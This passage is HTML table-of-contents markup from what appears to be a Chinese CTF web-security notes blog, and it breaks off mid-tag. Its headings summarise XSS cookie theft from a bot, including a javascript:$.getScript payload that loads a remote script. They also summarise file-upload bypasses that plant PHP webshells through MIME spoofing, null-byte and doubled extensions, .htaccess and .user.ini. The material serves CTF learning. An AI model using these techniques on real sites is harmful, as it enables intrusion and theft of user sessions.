href="#XSS%E5%9C%A8ctf%E4%B8%AD%E4%B8%80%E8%88%AC%E4%BD%93%E7%8E%B0%E4%B8%BA%E5%9C%A8%E7%BD%91%E7%AB%99%E4%B8%AD%E5%86%85%E7%BD%AE%E4%B8%80%E4%B8%AA%E6%9C%BA%E5%99%A8%E4%BA%BA%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86flag%E8%97%8F%E5%9C%A8%E5%AE%83%E7%9A%84cookie%E4%B8%AD%EF%BC%8C%E4%BB%A5%E4%BD%93%E7%8E%B0%E7%9C%9F%E5%AE%9E%E6%83%85%E5%86%B5%E7%9B%97%E5%8F%96%E4%BB%96%E4%BA%BA%E9%AB%98%E6%9D%83%E9%99%90cookie%E8%BF%9B%E8%A1%8C%E6%93%8D%E4%BD%9C%E7%9A%84%E6%BC%8F%E6%B4%9E%E3%80%82%E6%88%91%E4%BB%AC%E7%9A%84%E7%9B%AE%E7%9A%84%E4%B8%80%E8%88%AC%E4%BE%BF%E6%98%AF%E6%83%B3%E5%8A%9E%E6%B3%95%E8%AE%A9%E6%9C%BA%E5%99%A8%E4%BA%BA%E8%AE%BF%E9%97%AE%E6%88%91%E4%BB%AC%E5%88%B6%E4%BD%9C%E7%9A%84%E7%BD%91%E7%AB%99%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%8E%B7%E5%8F%96%E5%AE%83%E7%9A%84cookie%E3%80%82"><span class="toc-number">1.13.</span> <span class="toc-text">XSS在ctf中一般体现为在网站中内置一个机器人，然后将flag藏在它的cookie中，以体现真实情况盗取他人高权限cookie进行操作的漏洞。我们的目的一般便是想办法让机器人访问我们制作的网站，从而获取它的cookie。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8B%E5%92%8C%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-number">1.13.1.</span> <span class="toc-text">1)反射型和存储型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B%E5%8D%B3%E7%BD%91%E9%A1%B5%E7%9B%B4%E6%8E%A5%E5%B0%86%E8%BE%93%E5%85%A5%E7%9A%84%E5%86%85%E5%AE%B9%E8%BE%93%E5%87%BA%E5%87%BA%E6%9D%A5%EF%BC%8C%E4%B8%8D%E5%82%A8%E5%AD%98%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD-%E5%AD%98%E5%82%A8%E5%9E%8B%E5%88%99%E5%B0%86%E6%88%91%E4%BB%AC%E8%BE%93%E5%85%A5%E7%9A%84%E5%86%85%E5%AE%B9%E5%82%A8%E5%AD%98%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%EF%BC%8C%E5%8D%B1%E5%AE%B3%E6%9B%B4%E5%A4%A7"><span class="toc-number">1.13.2.</span> <span class="toc-text">反射型即网页直接将输入的内容输出出来，不储存在数据库中.存储型则将我们输入的内容储存在数据库中，危害更大.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8alert%E5%BC%B9%E7%AA%97%E9%AA%8C%E8%AF%81%E6%98%AF%E5%90%A6%E6%9C%89XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.13.3.</span> <span class="toc-text">利用alert弹窗验证是否有XSS漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%88%90%E5%8A%9F%E4%B9%8B%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%8E%BB%E6%89%BEXSS%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E5%B9%B3%E5%8F%B0%E5%A6%82%E8%93%9D%E8%8E%B2%E8%8A%B1%E7%AD%89%E8%BF%9B%E8%A1%8Ccookie%E6%8D%95%E8%8E%B7%E3%80%82"><span class="toc-number">1.13.4.</span> <span class="toc-text">验证成功之后就可以去找XSS数据接收平台如蓝莲花等进行cookie捕获。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-dom%E5%8F%8D%E5%B0%84"><span class="toc-number">1.13.5.</span> <span class="toc-text">2)dom反射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dom%E5%8F%8D%E5%B0%84%E9%9C%80%E8%A6%81%E6%88%91%E4%BB%AC%E6%83%B3%E5%8A%9E%E6%B3%95%E6%8A%8A%E8%BE%93%E5%85%A5%E7%9A%84%E5%91%BD%E4%BB%A4%E4%BB%8E%E4%B8%80%E4%B8%AA%E6%B3%A8%E9%87%8A%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%B8%80%E4%B8%AA%E6%B3%A8%E9%87%8A%E5%8A%A0%E4%B8%80%E4%B8%AA%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%80%9D%E8%B7%AF%E5%B0%B1%E6%98%AF%E6%8F%90%E5%89%8D%E7%94%A8-%E3%80%8A-script%E3%80%8B%E9%97%AD%E5%90%88-%E7%84%B6%E5%90%8E%E5%86%8D%E8%BE%93%E5%85%A5%E6%88%91%E4%BB%AC%E7%9A%84%E5%91%BD%E4%BB%A4%E3%80%82"><span class="toc-number">1.13.6.</span> <span class="toc-text">dom反射需要我们想办法把输入的命令从一个注释转换为一个注释加一个命令，思路就是提前用&#39;;《&#x2F;script》闭合,然后再输入我们的命令。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8alert%E5%BC%B9%E7%AA%97%E9%AA%8C%E8%AF%81%E6%98%AF%E5%90%A6%E6%9C%89XSS%E6%BC%8F%E6%B4%9E-1"><span class="toc-number">1.13.7.</span> <span class="toc-text">利用alert弹窗验证是否有XSS漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%88%90%E5%8A%9F%E4%B9%8B%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%8E%BB%E6%89%BEXSS%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E5%B9%B3%E5%8F%B0%E5%A6%82%E8%93%9D%E8%8E%B2%E8%8A%B1%E7%AD%89%E8%BF%9B%E8%A1%8Ccookie%E6%8D%95%E8%8E%B7%E3%80%82-1"><span class="toc-number">1.13.8.</span> <span class="toc-text">验证成功之后就可以去找XSS数据接收平台如蓝莲花等进行cookie捕获。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E5%92%8C%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%87%E6%BB%A4"><span class="toc-number">1.13.9.</span> <span class="toc-text">3)空格过滤和关键词过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%9B%B4%E6%8E%A5%E7%94%A8-20%E6%9B%BF%E4%BB%A3%EF%BC%8C%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%87%E6%BB%A4%E5%85%88%E5%88%A4%E6%96%AD%E8%BF%87%E6%BB%A4%E4%BA%86%E5%93%AA%E4%B8%AA%E5%85%B3%E9%94%AE%E8%AF%8D%EF%BC%8C%E8%BE%93%E5%85%A5%E3%80%8Ascript%E3%80%8Balert-1-%E3%80%8A-script%E3%80%8B-%E5%90%8E%E5%9B%9E%E6%98%BE%E4%B8%BAalert-1-%EF%BC%8C%E8%AF%B4%E6%98%8Escript%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%8C%E7%94%A8Script%E4%BB%A3%E6%9B%BFscript%E5%8D%B3%E5%8F%AF"><span class="toc-number">1.13.10.</span> <span class="toc-text">空格过滤直接用%20替代，关键词过滤先判断过滤了哪个关键词，输入《script》alert(1)《&#x2F;script》   后回显为&lt;&gt;alert(1)，说明script被过滤，直接大小写绕过，用Script代替script即可</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-dom%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.13.11.</span> <span class="toc-text">4)dom跳转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jumpto-javascript-getScript-%E7%BD%91%E5%9D%80-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BC%9A%E5%B0%86%E5%85%B6%E8%A7%A3%E9%87%8A%E4%B8%BA%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84URL%E6%96%B9%E6%A1%88%EF%BC%8C%E5%8D%B3-%E2%80%9Cjavascript-%E2%80%9D%E3%80%82%E5%9C%A8%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BC%9A%E5%B0%86%E5%90%8E%E9%9D%A2%E7%9A%84-JavaScript-%E4%BB%A3%E7%A0%81%E4%BD%9C%E4%B8%BAURL%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86%E8%BF%9B%E8%A1%8C%E8%A7%A3%E6%9E%90%EF%BC%8C%E7%84%B6%E5%90%8E%E6%89%A7%E8%A1%8C%E5%AE%83"><span class="toc-number">1.13.12.</span> <span class="toc-text">?jumpto&#x3D;javascript:$.getScript(&quot;网址&quot;),浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%97%A0%E9%AA%8C%E8%AF%81"><span class="toc-number">2.1.</span> <span class="toc-text">1)无验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%96%87%E4%BB%B6%E5%A6%82%E6%9E%9C%E8%83%BD%E6%8C%89php%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E5%90%8E%E6%89%A7%E8%A1%8C%EF%BC%8C%E4%BE%BF%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-%E7%9A%84php%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E9%80%9A%E8%BF%87%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E8%BF%9B%E8%A1%8C%E6%8E%A7%E5%88%B6%EF%BC%8C%E5%9C%A8%E7%9B%AE%E5%BD%95%E4%B8%AD%E6%89%BE%E5%88%B0flag%EF%BC%8C%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E4%B8%AD%E5%9C%A8%E5%AF%B9%E6%96%B9%E7%BD%91%E7%AB%99%E4%B8%AD%E7%9B%97%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E6%93%8D%E4%BD%9C%E3%80%82"><span class="toc-number">2.1.1.</span> <span class="toc-text">网站上传的文件如果能按php文件访问后执行，便可以通过上传一句话木马&#96;&#96;的php文件，并通过蚁剑连接进行控制，在目录中找到flag，模拟实战中在对方网站中盗取数据的操作。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA-php%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E8%AE%B0%E4%BA%8B%E6%9C%AC%E6%89%93%E5%BC%80%EF%BC%8C%E8%BE%93%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%8C%E7%84%B6%E5%90%8E%E4%B8%8A%E4%BC%A0%EF%BC%8C%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF%E3%80%82"><span class="toc-number">2.1.2.</span> <span class="toc-text">所以直接新建一个.php文件，然后记事本打开，输入一句话木马，然后上传，蚁剑连接即可。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="toc-number">2.2.</span> <span class="toc-text">2)前端验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81%E5%8F%AF%E4%BB%A5%E6%8C%89F12%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E9%9D%A2%E6%9D%BF%EF%BC%8C%E9%80%89%E6%8B%A9%E7%BD%91%E7%BB%9C%EF%BC%8C%E7%84%B6%E5%90%8E%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%E5%92%8C%E9%9D%9E%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E5%AF%B9%E8%BF%99%E4%B8%A4%E4%B8%AA%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%98%E5%8C%96%E8%BF%9B%E8%A1%8C%E5%AF%B9%E6%AF%94%EF%BC%8C%E5%A6%82%E6%9E%9C%E7%BD%91%E7%BB%9C%E4%B8%AD%E6%B2%A1%E6%9C%89%E6%95%B0%E6%8D%AE%E5%8F%98%E5%8C%96%EF%BC%8C%E8%AF%B4%E6%98%8E%E5%AD%98%E5%9C%A8js%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%89%E5%8F%98%E5%8C%96%E8%AF%B4%E6%98%8E%E4%B8%8D%E5%AD%98%E5%9C%A8%E3%80%82-%E6%9C%89%E5%8F%98%E5%8C%96%E8%AF%B4%E6%98%8E%EF%BC%8C%E5%89%8D%E7%AB%AF%E6%B2%A1%E6%9C%89%E5%81%9A%E9%AA%8C%E8%AF%81%EF%BC%8C%E6%98%AF%E6%8A%8A%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%88%B0%E5%90%8E%E5%8F%B0%EF%BC%8C%E5%9C%A8%E5%90%8E%E5%8F%B0%E8%BF%9B%E8%A1%8C%E9%AA%8C%E8%AF%81%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E6%89%8D%E4%BC%9A%E6%9C%89%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E3%80%82"><span class="toc-number">2.2.1.</span> <span class="toc-text">前端验证可以按F12打开调试面板，选择网络，然后上传图片文件和非图片文件，然后对这两个文件的变化进行对比，如果网络中没有数据变化，说明存在js前端验证漏洞，如果有变化说明不存在。(有变化说明，前端没有做验证，是把文件传输到后台，在后台进行验证的，所以才会有网络请求。)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%A0%E4%B8%BA%E6%98%AF%E5%9C%A8%E5%89%8D%E7%AB%AF%E8%BF%9B%E8%A1%8C%E9%AA%8C%E8%AF%81%EF%BC%8C%E6%89%80%E4%BB%A5%E7%9B%B4%E6%8E%A5BP%E6%8B%A6%E6%88%AA%E8%BF%9B%E8%A1%8C%E4%BF%AE%E6%94%B9%EF%BC%8C%E5%85%88%E5%B0%86%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D%E6%94%B9%E4%B8%BA%E7%99%BD%E5%90%8D%E5%8D%95%E4%B8%AD%E7%9A%84%E5%90%8E%E7%BC%80%E5%90%8D%EF%BC%8C%E5%86%8D%E5%9C%A8%E6%8A%93%E5%8C%85%E5%90%8E%E6%94%B9%E5%9B%9E-php%EF%BC%8C%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF%E3%80%82"><span class="toc-number">2.2.2.</span> <span class="toc-text">因为是在前端进行验证，所以直接BP拦截进行修改，先将上传的文件后缀名改为白名单中的后缀名，再在抓包后改回.php，蚁剑连接即可。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-htaccess"><span class="toc-number">2.3.</span> <span class="toc-text">3).htaccess</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess%E6%96%87%E4%BB%B6%E6%98%AFapache%E7%9A%84%E5%88%86%E5%B8%83%E5%BC%8F%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E3%80%82%E4%BB%96%E8%B4%9F%E8%B4%A3%E7%9B%B8%E5%85%B3%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E7%BD%91%E9%A1%B5%E9%85%8D%E7%BD%AE%EF%BC%8C%E9%80%9A%E8%BF%87-htaccess%E5%8F%AF%E4%BB%A5%E5%B8%AE%E6%88%91%E4%BB%AC%E5%AE%9E%E7%8E%B0%E3%80%82%E5%BF%85%E9%A1%BB%E4%BB%A5ASCII%E6%A8%A1%E5%BC%8F%E4%B8%8A%E4%BC%A0%EF%BC%8C%E5%B9%B6%E4%B8%94%E7%BB%99%E5%85%B6%E5%8F%AF%E8%AF%BB%E6%80%A7%E3%80%82"><span class="toc-number">2.3.1.</span> <span class="toc-text">.htaccess文件是apache的分布式配置文件。他负责相关目录下的网页配置，通过.htaccess可以帮我们实现。必须以ASCII模式上传，并且给其可读性。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E8%BF%99%E6%AE%B5%E4%BB%A3%E7%A0%81%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%96%B0%E5%BB%BA%E7%9A%84-htaccess%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E8%BF%9B%E8%A1%8C%E4%B8%8A%E4%BC%A0%EF%BC%8C%E8%BF%99%E6%97%B6%E4%B8%8A%E4%BC%A0-xxx%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%E5%86%8D%E7%94%A8%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF"><span class="toc-number">2.3.2.</span> <span class="toc-text">将这段代码写入本地新建的.htaccess文件，并进行上传，这时上传.xxx的一句话木马文件再用蚁剑连接即可</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-MIME%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">4)MIME绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MIME-Multipurpose-Internet-Mail-Extensions-%E6%98%AF%E6%8F%8F%E8%BF%B0%E6%B6%88%E6%81%AF%E5%86%85%E5%AE%B9%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%9B%A0%E7%89%B9%E7%BD%91%E6%A0%87%E5%87%86%E3%80%82MIME%E6%B6%88%E6%81%AF%E8%83%BD%E5%8C%85%E5%90%AB%E6%96%87%E6%9C%AC%E3%80%81%E5%9B%BE%E5%83%8F%E3%80%81%E9%9F%B3%E9%A2%91%E3%80%81%E8%A7%86%E9%A2%91%E4%BB%A5%E5%8F%8A%E5%85%B6%E4%BB%96%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%93%E7%94%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E3%80%82%E5%9C%A8HTTP%E5%8D%8F%E8%AE%AE%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8Content-Type%E5%AD%97%E6%AE%B5%E8%A1%A8%E7%A4%BA%E6%96%87%E4%BB%B6%E7%9A%84MIME%E7%B1%BB%E5%9E%8B%E3%80%82"><span class="toc-number">2.4.1.</span> <span class="toc-text">MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。在HTTP协议中，使用Content-Type字段表示文件的MIME类型。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E7%9B%B4%E6%8E%A5BP%E6%8B%A6%E6%88%AA%EF%BC%8C%E4%BF%AE%E6%94%B9Content-Type%E5%AD%97%E6%AE%B5%E4%B8%BAimage-jpeg%E7%AD%89%E7%BD%91%E7%AB%99%E7%99%BD%E5%90%8D%E5%8D%95%E7%B1%BB%E5%9E%8B%EF%BC%8C%E4%B8%8A%E4%BC%A0-php%E7%B1%BB%E5%9E%8B%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%8C%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF%E3%80%82"><span class="toc-number">2.4.2.</span> <span class="toc-text">所以直接BP拦截，修改Content-Type字段为image&#x2F;jpeg等网站白名单类型，上传.php类型的一句话木马，蚁剑连接即可。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5"><span class="toc-number">2.5.</span> <span class="toc-text">5)文件头检查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%A0%E4%B8%BA%E6%A3%80%E9%AA%8C%E7%9A%84%E6%98%AF%E6%96%87%E4%BB%B6%E5%A4%B4%EF%BC%8C%E6%89%80%E4%BB%A5%E6%89%BE%E4%B8%80%E4%B8%AA%E7%8E%B0%E6%88%90%E7%9A%84%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%86%E6%96%87%E4%BB%B6%E7%94%A8%E8%AE%B0%E4%BA%8B%E6%9C%AC%E7%BC%96%E8%BE%91%EF%BC%8C%E5%9C%A8%E6%9C%80%E5%90%8E%E5%86%99%E4%B8%8A%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%8C%E4%B8%8A%E4%BC%A0%E6%97%B6%E7%94%A8BP%E6%8B%A6%E6%88%AA%EF%BC%8C%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D%E4%B8%BA-php%E5%8D%B3%E5%8F%AF%E8%9A%81%E5%89%91%E8%AE%BF%E9%97%AE%E3%80%82"><span class="toc-number">2.5.1.</span> <span class="toc-text">因为检验的是文件头，所以找一个现成的图片文件，将文件用记事本编辑，在最后写上一句话木马，上传时用BP拦截，修改文件后缀名为.php即可蚁剑访问。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-00%E6%88%AA%E6%96%AD"><span class="toc-number">2.6.</span> <span class="toc-text">6)00截断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#00%E5%8D%B3ascii%E7%A0%81%E4%B8%AD%E7%9A%84null%EF%BC%8C%E5%9C%A8%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%90%8D%E6%97%B6%E9%81%87%E8%A7%81null%E4%BC%9A%E5%88%A4%E6%96%AD%E4%B8%BA%E6%96%87%E4%BB%B6%E5%90%8D%E7%BB%93%E6%9D%9F%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E4%BB%A5%E7%94%A800%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%90%8D%EF%BC%8C%E6%9E%84%E9%80%A0-php-00-png%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%EF%BC%88-00%E5%9C%A8url%E7%BC%96%E7%A0%81%E4%B8%AD%E4%B8%BAnull%EF%BC%89%EF%BC%8C%E5%9B%A0%E4%B8%BA%E5%9C%A8%E4%B8%8A%E4%BC%A0%E5%90%8E%E7%BD%91%E5%9D%80%E5%90%8E%E5%A4%9A%E4%BA%86%E4%B8%80%E6%AE%B5-xxx-%E2%80%A6-upload%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E4%BB%A5%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%97%B6%E5%9C%A8BP%E4%B8%AD%E6%8B%A6%E6%88%AA%EF%BC%8C%E5%B9%B6%E5%9C%A8%E8%BF%99%E6%AE%B5%E5%A4%9A%E5%87%BA%E6%9D%A5%E7%9A%84%E8%AF%AD%E5%8F%A5%E5%90%8E%E9%9D%A2%E6%8E%A5%E4%B8%8A-php-00-png%EF%BC%8C%E9%80%9A%E8%BF%87url%E7%BC%96%E7%A0%81%E8%BF%9B%E8%A1%8C00%E6%88%AA%E6%96%AD%EF%BC%8C%E5%86%8D%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF%E3%80%82"><span class="toc-number">2.6.1.</span> <span class="toc-text">00即ascii码中的null，在读取文件名时遇见null会判断为文件名结束，所以可以用00截断文件名，构造.php%00.png的文件名（%00在url编码中为null），因为在上传后网址后多了一段?xxx&#x3D;…&#x2F;upload，所以可以上传文件时在BP中拦截，并在这段多出来的语句后面接上.php%00.png，通过url编码进行00截断，再蚁剑连接即可。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E5%8F%8C%E5%86%99%E6%88%AA%E6%96%AD"><span class="toc-number">2.7.</span> <span class="toc-text">7)双写截断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%95%E7%9D%80%E4%B8%8A%E4%BC%A0%E4%BA%86-php%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%91%E7%8E%B0%E5%8F%98%E6%88%90%E4%BA%86-%EF%BC%8C%E8%AF%B4%E6%98%8Ephp%E8%A2%AB%E5%88%A0%E6%8E%89%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80%E5%90%8D%EF%BC%8C%E8%AE%A9%E5%90%8E%E7%BC%80%E5%90%8D%E5%9C%A8%E8%A2%AB%E5%88%A0%E6%8E%89%E4%B8%80%E4%B8%AAphp%E5%90%8E%E8%BF%98%E8%83%BD%E6%98%AFphp%EF%BC%8C%E5%8D%B3-pphphp%E5%8D%B3%E5%8F%AF%EF%BC%8C%E5%86%8D%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF%E3%80%82"><span class="toc-number">2.7.1.</span> <span class="toc-text">试着上传了.php文件后发现变成了.，说明php被删掉了，所以双写后缀名，让后缀名在被删掉一个php后还能是php，即.pphphp即可，再蚁剑连接即可。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-user-ini-%EF%BC%88-SUCTF-2019-CheckIn%EF%BC%89"><span class="toc-number">2.8.</span> <span class="toc-text">8).user.ini   （[SUCTF 2019]CheckIn）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xxxx-ini-%E6%96%87%E4%BB%B6%E6%98%AF%E9%85%8D%E7%BD%AE%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E4%BB%A5%E5%8F%8A%E5%BD%93%E5%89%8D%E5%AD%90%E7%9B%AE%E5%BD%95%E7%9A%84%E8%A7%84%E5%88%99%E9%85%8D%E7%BD%AE%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%AD%E7%9A%84%E9%85%8D%E7%BD%AE%E4%BC%9A%E8%A6%86%E7%9B%96%E6%8E%89%E5%BD%93%E5%89%8Dphp-ini%E4%B8%AD%E7%9A%84%E8%A7%84%E5%88%99%EF%BC%8C%E6%98%AF%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%8C%E5%88%A9%E7%94%A8-user-ini-%E7%9A%84%E5%89%8D%E6%8F%90%E6%98%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E5%90%AF%E4%BA%86-CGI-%E6%88%96%E8%80%85-FastCGI%EF%BC%8C%E5%B9%B6%E4%B8%94%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84%E4%B8%8B%E6%9C%89-index-php-%E7%AD%89%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%EF%BC%89%E3%80%82"><span class="toc-number">2.8.1.</span> <span class="toc-text">.xxxx.ini　文件是配置当前目录以及当前子目录的规则配置的文件，文件的中的配置会覆盖掉当前php.ini中的规则，是当前用户的配置文件，利用 .user.ini 的前提是服务器开启了 CGI 或者 FastCGI，并且上传文件的存储路径下有 index.php 等可执行文件）。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0-user-ini-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">2.8.2.</span> <span class="toc-text">上传 .user.ini 文件内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E9%80%89%E4%B8%80-%E5%B0%B1%E5%8F%AF%E4%BB%A5"><span class="toc-number">2.8.3.</span> <span class="toc-text">二选一 就可以</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 